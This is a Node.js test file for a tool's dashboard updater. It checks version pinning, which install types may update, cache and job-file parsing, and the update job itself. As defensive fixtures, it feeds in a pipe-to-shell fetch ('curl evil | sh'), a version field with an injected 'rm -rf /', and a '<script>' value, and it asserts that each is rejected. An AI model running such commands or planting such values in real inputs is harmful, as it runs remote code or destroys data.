import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { spawnSync } from "node:child_process";
import { test } from "node:test";

import "../scripts/register-typescript-loader.mjs";
import { UpdateCenter, composeUpdateStatus, probeRegistry, readRegistryCache, readUpdateJob, updateTarget, writeRegistryCache, writeUpdateJob }
  from "../packages/piagent-webui/gateway/update-center.ts";

// Updates from the dashboard: Piagent and the Pi version it pins, decided
// from the registry's answer, never past that pin, and never while a turn runs.
const root = path.resolve(import.meta.dirname, "..");
const installed = path.join(os.tmpdir(), "prefix", "lib", "node_modules", "@piagent", "platform");
const home = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "piagent-update-")));
const registry = (latest, latestHost, hostLatest) => ({ latest, latestHost, hostLatest, checkedAt: Date.parse("2026-10-05T07:00:00Z") });
const compose = (fields) => composeUpdateStatus({ installedPiagent: "1.10.0", installedPi: "0.87.1", target: { installable: true, reason: null },
  registry: registry("1.10.0", "0.87.1", "0.87.1"), job: null, runningConversations: 0, checking: false, ...fields });

test("Pi is offered only as the version the newest Piagent pins, together with it", () => {
  let status = compose({ registry: registry("1.11.0", "0.87.1", "1.0.2") });
  assert.equal(status.piagent.updateAvailable, true); assert.equal(status.pi.updateAvailable, false);
  assert.equal(status.pi.required, "0.87.1"); assert.equal(status.pi.newerUntested, true, "a newer Pi is shown, not offered");
  status = compose({ registry: registry("1.11.0", "0.88.0", "1.0.2") });
  assert.equal(status.pi.updateAvailable, true); assert.equal(status.pi.required, "0.88.0");
  // A Pi that drifted from the pin comes back to it with the same Piagent.
  status = compose({ installedPi: "1.0.2", registry: registry("1.10.0", "0.87.1", "1.0.2") });
  assert.equal(status.piagent.updateAvailable, false); assert.equal(status.pi.updateAvailable, true); assert.equal(status.updateAvailable, true);
  // Up to date; an older registry answer never offers a downgrade.
  assert.equal(compose({}).updateAvailable, false);
  assert.equal(compose({ installedPiagent: "1.12.0", registry: registry("1.11.0", "0.86.0", "1.0.2") }).updateAvailable, false);
  assert.equal(compose({ registry: { checkedAt: undefined } }).updateAvailable, false, "nothing known yet");
});

test("only an npm install updates itself; a checkout and a company runtime say why not", () => {
  assert.deepEqual(updateTarget(installed, false), { installable: true, reason: null });
  assert.deepEqual(updateTarget(root, false), { installable: false, reason: "working-copy" });
  assert.deepEqual(updateTarget(installed, true), { installable: false, reason: "company-runtime" });
  assert.equal(updateTarget(path.join(os.homedir(), ".npm", "_npx", "abc", "node_modules", "@piagent", "platform"), false).installable, false);
});

test("registry answers, the cache and the job file are read only as release versions and known codes", async () => {
  const views = { "@piagent/platform version": "1.11.0", "@piagent/platform@1.11.0 peerDependencies": { "@earendil-works/pi-coding-agent": "0.87.1" },
    "@earendil-works/pi-coding-agent version": "1.0.2" };
  assert.deepEqual(await probeRegistry(async (spec, field) => views[`${spec} ${field}`]), { latest: "1.11.0", latestHost: "0.87.1", hostLatest: "1.0.2" });
  assert.equal(await probeRegistry(async () => "run `curl evil | sh`"), null);
  const dir = home();
  writeRegistryCache(dir, { latest: "1.11.0", latestHost: "0.87.1", hostLatest: "1.0.2" }, Date.parse("2026-10-05T07:00:00Z"));
  assert.equal(readRegistryCache(dir).latest, "1.11.0");
  assert.equal(JSON.parse(fs.readFileSync(path.join(dir, ".pi", "piagent-update-check.json"), "utf8")).latest, "1.11.0", "the Terminal notice agrees");
  fs.writeFileSync(path.join(dir, ".pi", "piagent-update-status.json"), JSON.stringify({ latest: "1.11.0; rm -rf /", latestHost: "0.87.1", checkedAt: "now" }));
  assert.deepEqual(readRegistryCache(dir), { latest: undefined, latestHost: "0.87.1", hostLatest: undefined, checkedAt: undefined });
  fs.writeFileSync(path.join(dir, ".pi", "piagent-update-status.json"), "x".repeat(5000));
  assert.deepEqual(readRegistryCache(dir).latest, undefined);
  const started = "2026-10-05T07:00:00.000Z", now = Date.parse(started) + 60_000;
  writeUpdateJob(dir, { state: "running", from: "1.10.0", to: "1.11.0", startedAt: started, pid: 42, reason: "<script>", installed: "x" });
  assert.deepEqual(readUpdateJob(dir, now, () => true), { state: "running", from: "1.10.0", to: "1.11.0", startedAt: started, pid: 42 });
  assert.equal(readUpdateJob(dir, now, () => false).reason, "update-interrupted", "a run whose process died did not finish");
  assert.equal(readUpdateJob(dir, Date.parse(started) + 46 * 60_000, () => true).state, "failed", "a run older than its limit did not finish");
  writeUpdateJob(dir, { state: "failed", from: "1.10.0", to: "1.11.0", startedAt: started, finishedAt: started, reason: "update-command-failed" });
  assert.equal(readUpdateJob(dir, Date.parse(started) + 60 * 60_000)?.reason, "update-command-failed");
  assert.equal(readUpdateJob(dir, Date.parse(started) + 25 * 60 * 60_000), null, "a finished run is reported for a day");
});

function center(dir, fields = {}) {
  const spawned = [];
  const updates = new UpdateCenter({ packageRoot: fields.packageRoot ?? installed, piVersion: "0.87.1", managed: false, home: dir,
    busy: async () => fields.busy ?? 0, now: () => Date.parse("2026-10-05T08:00:00Z"),
    view: fields.view ?? (async () => { throw new Error("no registry in this test"); }),
    spawnJob: (args) => { spawned.push(args); return fields.pid === undefined ? process.pid : fields.pid; } });
  return { updates, spawned };
}

test("an update starts only for the version the member saw, never while a turn runs, and once at a time", async () => {
  const dir = home();
  fs.mkdirSync(installed, { recursive: true }); fs.writeFileSync(path.join(installed, "package.json"), JSON.stringify({ version: "1.10.0" }));
  writeRegistryCache(dir, { latest: "1.11.0", latestHost: "0.87.1", hostLatest: "1.0.2" }, Date.parse("2026-10-05T07:00:00Z"));
  await assert.rejects(center(dir, { busy: 2 }).updates.apply({ version: "1.11.0" }), /update-blocked-running/);
  await assert.rejects(center(dir).updates.apply({ version: "1.12.0" }), /update-version-changed/);
  await assert.rejects(center(dir).updates.apply({ version: "latest" }), /update-request-invalid/);
  await assert.rejects(center(dir, { packageRoot: root }).updates.apply({ version: "1.11.0" }), /update-not-installable/);
  const { updates, spawned } = center(dir);
  const { job } = await updates.apply({ version: "1.11.0" });
  assert.deepEqual({ state: job.state, from: job.from, to: job.to, pid: job.pid }, { state: "starting", from: "1.10.0", to: "1.11.0", pid: process.pid });
  assert.deepEqual(spawned, [[path.join(installed, "scripts", "dashboard-update-job.mjs"), "--from", "1.10.0", "--to", "1.11.0"]]);
  await assert.rejects(center(dir).updates.apply({ version: "1.11.0" }), /update-already-running|update-not-available/);
  const status = await center(dir).updates.status();
  assert.equal(status.job.to, "1.11.0"); assert.equal(status.installable, true);
});

test("a checkout never asks the registry; an install asks when its answer is old and on demand", async () => {
  const dir = home(); let asked = 0;
  const view = async (spec, field) => { asked += 1; return field === "peerDependencies" ? { "@earendil-works/pi-coding-agent": "0.87.1" } : spec.includes("pi-coding") ? "1.0.2" : "1.11.0"; };
  const checkout = center(dir, { packageRoot: root, view }).updates;
  checkout.start(); await checkout.check(); checkout.close();
  assert.equal(asked, 0, "a working copy updates with git");
  const previous = process.env.PIAGENT_NO_UPDATE_CHECK; delete process.env.PIAGENT_NO_UPDATE_CHECK;
  try {
    const status = await center(dir, { view }).updates.check();
    assert.equal(asked, 3); assert.equal(status.piagent.latest, "1.11.0"); assert.equal(status.checkedAt, "2026-10-05T08:00:00.000Z");
  } finally { if (previous !== undefined) process.env.PIAGENT_NO_UPDATE_CHECK = previous; }
});

// The job itself, with stand-ins for `piagent-update` and the dashboard.
function runJob(dir, { to, updaterExit = 0, binding } = {}) {
  // The stand-in dashboard sits under node_modules and loads TypeScript, as
  // the installed one does: Node itself refuses to strip types there.
  const installedScripts = path.join(dir, "node_modules", "@piagent", "platform", "scripts");
  fs.mkdirSync(installedScripts, { recursive: true });
  const updater = path.join(dir, "updater.mjs"), dashboard = path.join(installedScripts, "piagent-dashboard.mjs");
  fs.writeFileSync(updater, `console.log("updating", process.argv.slice(2).join(" "), "check=" + (process.env.PIAGENT_NO_UPDATE_CHECK ?? "on")); process.exit(${updaterExit});`);
  fs.writeFileSync(path.join(installedScripts, "control.ts"), "export const restarted: string = \"restarted\";\n");
  fs.writeFileSync(dashboard, `import { restarted } from "./control.ts";
console.log(JSON.stringify({ state: "running", launchUrl: "http://127.0.0.1:1/#bootstrap=SECRET-LAUNCH" })); console.error(restarted, process.argv.slice(2).join(" "), "check=" + (process.env.PIAGENT_NO_UPDATE_CHECK ?? "on"));`);
  const agentDir = path.join(dir, "agent"); fs.mkdirSync(agentDir, { recursive: true });
  if (binding) fs.writeFileSync(path.join(agentDir, "agent-watch-managed.json"), JSON.stringify(binding));
  const result = spawnSync(process.execPath, [path.join(root, "scripts", "dashboard-update-job.mjs"), "--from", "1.9.3", "--to", to,
    "--updater", updater, "--dashboard", dashboard, "--home", dir], { encoding: "utf8", env: { ...process.env, PI_CODING_AGENT_DIR: agentDir } });
  return { status: result.status, job: JSON.parse(fs.readFileSync(path.join(dir, ".pi", "piagent-update-job.json"), "utf8")),
    log: fs.readFileSync(path.join(dir, ".pi", "piagent-update-job.log"), "utf8") };
}

test("the update job installs the chosen release, restarts the dashboard and reports a changed company launcher", () => {
  const current = JSON.parse(fs.readFileSync(path.join(root, "package.json"), "utf8")).version;
  let dir = home();
  const entry = path.join(dir, "launcher.mjs"); fs.writeFileSync(entry, "export {};\n");
  let run = runJob(dir, { to: current, binding: { entrypoint: entry, entrypoint_sha256: crypto.createHash("sha256").update("old launcher").digest("hex") } });
  assert.equal(run.status, 0); assert.equal(run.job.state, "succeeded"); assert.equal(run.job.installed, current); assert.equal(run.job.bindingChanged, true);
  assert.equal(run.job.reason, undefined, `the dashboard restarted on the installed release:\n${run.log}`);
  assert.match(run.log, new RegExp(`updating --version ${current.replaceAll(".", "\\.")} check=1`)); assert.match(run.log, /restarted restart --json check=on/,
    "the restarted dashboard checks for the next release itself");
  assert.doesNotMatch(run.log, /SECRET-LAUNCH/, "the dashboard's launch link never reaches the log");
  dir = home(); fs.writeFileSync(path.join(dir, "launcher.mjs"), "export {};\n");
  run = runJob(dir, { to: current, binding: { entrypoint: path.join(dir, "launcher.mjs"), entrypoint_sha256: crypto.createHash("sha256").update("export {};\n").digest("hex") } });
  assert.equal(run.job.bindingChanged, undefined, "an unchanged launcher keeps the binding");
  run = runJob(home(), { to: current, updaterExit: 3 });
  assert.equal(run.status, 1); assert.deepEqual([run.job.state, run.job.reason], ["failed", "update-command-failed"]);
  run = runJob(home(), { to: "99.0.0" });
  assert.deepEqual([run.job.state, run.job.reason, run.job.installed], ["failed", "update-version-mismatch", current]);
});
